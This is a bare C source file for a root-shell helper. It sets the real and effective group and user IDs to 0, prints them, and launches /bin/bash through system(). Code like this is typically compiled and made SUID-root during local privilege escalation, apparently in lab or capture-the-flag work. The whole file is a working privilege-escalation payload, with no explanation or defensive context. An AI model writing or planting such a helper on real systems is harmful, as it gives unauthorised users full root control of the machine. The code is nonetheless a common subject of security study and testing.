#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>

int main(){
    setregid(0, 0);
    setreuid(0, 0);

    printf("\nGID :%d", getgid());
    printf(" UID : %d\n", getuid());

    system("/bin/bash");

    printf("\nGID :%d", getgid());
    printf(" UID : %d\n", getuid());

    return 0;
}